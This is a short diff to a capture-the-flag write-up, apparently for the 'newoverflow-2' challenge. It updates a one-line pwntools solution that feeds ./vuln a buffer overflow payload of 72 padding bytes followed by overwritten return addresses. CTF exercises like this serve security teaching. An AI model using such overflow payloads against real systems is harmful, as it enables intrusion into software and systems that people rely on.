@@ -6,7 +6,7 @@ Okay now lets try mainpulating arguments. program. You can find it in /problems/
 
 ## Solution
 
-cd /problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7; python2 -c 'from pwn import *; print "A"*72 + p64(0x040084d)' | ./vuln
+cd /problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7; python2 -c 'from pwn import *; print "A"*72 + p64(0x4008ce) + p64(0x040084d)' | ./vuln
 
 ## Notes
 
